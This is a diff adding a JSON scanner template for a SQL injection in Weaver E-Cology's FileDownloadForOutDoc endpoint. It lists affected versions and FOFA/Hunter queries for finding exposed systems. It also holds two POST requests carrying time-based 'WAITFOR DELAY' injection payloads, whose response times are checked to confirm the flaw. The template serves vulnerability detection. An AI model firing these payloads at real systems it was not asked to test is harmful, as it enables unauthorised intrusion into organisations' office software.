@@ -1,0 +1,63 @@
+{
+  "product": "泛微 E-Cology",
+  "vul_name": "泛微 E-Cology weaver.file.FileDownloadForOutDoc SQL注入",
+  "type": "SQL注入",
+  "vul_id": [
+    "CVE-2023-15672"
+  ],
+  "level": 3,
+  "vul_desc": "泛微e-cology未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限等。",
+  "version": "E-cology 9.x 补丁版本 < 10.58.0；Ecology 8.x 补丁版本 < 10.58.0",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"泛微-协同办公OA\"",
+    "Hunter": "app.name=\"泛微 e-cology 9.0 OA\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/pursue-security/p/17677238.html",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/weaver/weaver.file.FileDownloadForOutDoc",
+        "data": "fileid=119+WAITFOR+DELAY+'0:0:8'&isFromOutImg=1"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "time": {
+              "check": ">=",
+              "num": 8
+            }
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/weaver/weaver.file.FileDownloadForOutDoc",
+        "data": "fileid=129+WAITFOR+DELAY+'0:0:0'&isFromOutImg=1"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "time": {
+              "check": "<=",
+              "num": 7
+            }
+          }
+        ]
+      }
+    }
+  ]
+}
